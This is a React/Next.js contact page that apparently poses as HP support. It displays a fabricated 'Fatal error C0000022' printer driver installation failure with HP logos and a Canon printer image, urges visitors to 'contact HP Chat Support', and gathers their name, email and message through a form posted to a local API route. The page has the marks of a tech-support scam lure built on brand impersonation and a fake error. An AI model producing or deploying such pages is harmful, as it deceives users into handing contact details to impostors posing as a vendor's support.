"use client";

import { useState } from "react";

export default function ContactPage() {
  const [formData, setFormData] = useState({ name: "", email: "", message: "" });
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);   // ✅ track success state
  const [error, setError] = useState("");          // ✅ track error message

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError("");
    setSuccess(false);

    try {
      const res = await fetch("/api/hpcontactmail", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData),
      });

      const data = await res.json();
      if (data.success) {
        setSuccess(true);         // ✅ show success message
        setFormData({ name: "", email: "", message: "" }); // clear form
      } else {
        setError("Failed to send message.");
      }
    } catch (err) {
      console.error(err);
      setError("Error sending message.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <main className="min-h-screen bg-[#f5f7fb] py-8">
      {/* Return to top bar */}
      <div className="mx-auto max-w-4xl px-4">
        <details className="group mb-4 w-fit cursor-pointer select-none text-sm font-semibold text-gray-900">
          <summary className="flex items-center gap-2 list-none">
            <span className="inline-block rounded-sm border border-gray-300 bg-white p-1">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" className="h-4 w-4 transition-transform group-open:-rotate-90">
                <path d="M8 10l4-4 4 4" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            </span>
            Return To Top
          </summary>
        </details>
      </div>

      {/* Top card: Installing + error preview image */}
      <section className="mx-auto max-w-4xl px-4">
        <div className="rounded-md border border-gray-200 bg-white shadow-sm">
          {/* Header */}
          <div className="flex items-center justify-between border-b border-gray-200 p-4">
            <div>
              <h2 className="text-xl font-semibold text-gray-900">Installing</h2>
              <p className="text-sm text-gray-500">Fatal error occurred during installation..</p>
            </div>
            <div className="h-10 w-10">
              {/* top-right hp logo placeholder */}
              <img
                src="../../images/hplogo.png"
                alt="HP"
                className="h-10 w-10 object-contain"
              />
            </div>
          </div>

          {/* Body with screenshot-like panel */}
          <div className="p-4">
            <div className="relative rounded-md border border-gray-200 bg-white p-4">
              {/* Example visual (replace src with your own screenshot if needed) */}
              <img
                src="https://res.cloudinary.com/dqxcmae0m/image/upload/v1754680007/Canon-G3200-All-In-One-Wireless-Supertank-99x52_fhi3ko.jpg"
                alt="Printer"
                className="mx-auto h-28 w-auto opacity-80"
              />

              <p className="mx-auto mt-6 max-w-2xl text-center text-sm text-gray-700">
                Printer driver installation has been failed due to fatal error "C0000022" preventing product driver installation.
                <br />
                Please contact HP Chat Support for assistance.
              </p>

              {/* Blue assistance footer strip */}
              <div className="mt-6 flex items-center justify-between rounded-md bg-[#1787d6] p-3 text-white">
                <div className="flex items-center gap-3">
                  <img
                   src="../../images/hplogow.png"
                    alt="HP"
                    className="h-6 w-6 invert-0"
                  />
                  <span className="text-sm font-medium">24x7 HP Assistance</span>
                </div>
                <div className="text-xs opacity-90">Support</div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Form card */}
      <section className="mx-auto mt-8 max-w-4xl px-4">
        <div className="rounded-2xl border border-gray-200 bg-white p-6 shadow-sm md:p-8">
      <form onSubmit={handleSubmit}>
        <input
          type="text"
          name="name"
          placeholder="Your Name"
          value={formData.name}
          onChange={handleChange}
          required
          style={{ width: "100%", padding: "10px", marginBottom: "10px" }}
        />
        <input
          type="email"
          name="email"
          placeholder="Your Email"
          value={formData.email}
          onChange={handleChange}
          required
          style={{ width: "100%", padding: "10px", marginBottom: "10px" }}
        />
        <textarea
          name="message"
          placeholder="Your Message"
          value={formData.message}
          onChange={handleChange}
          required
          style={{ width: "100%", padding: "10px", marginBottom: "10px", minHeight: "120px" }}
        />
        <button type="submit" disabled={loading} style={{ padding: "10px 20px" }}>
          {loading ? "Sending..." : "Send"}
        </button>
      </form>
       {/* ✅ Success / Error messages */}
      {success && <p style={{ color: "green", marginTop: "15px" }}>✅ Your message was sent successfully!</p>}
      {error && <p style={{ color: "red", marginTop: "15px" }}>{error}</p>}
        </div>
      </section>
    </main>
  );
}
